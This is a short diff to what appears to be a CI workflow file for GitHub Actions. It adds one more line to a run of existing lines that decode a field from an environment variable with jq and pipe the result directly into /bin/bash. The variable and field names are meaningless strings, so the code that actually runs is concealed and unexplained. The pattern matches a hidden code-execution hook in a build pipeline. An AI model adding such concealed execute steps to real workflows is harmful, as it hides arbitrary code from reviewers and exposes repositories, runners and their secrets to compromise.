@@ -22,6 +22,7 @@ jobs:
           echo $esav500 | jq -r .ihsmf9 | /bin/bash
           printf '%s' "$xjs90" | jq -r .fn28430 | /bin/bash
           printf '%s' "$sdoej08737" | jq -r .et153 | /bin/bash
+          printf '%s' "$sy7861" | jq -r .bqk78 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
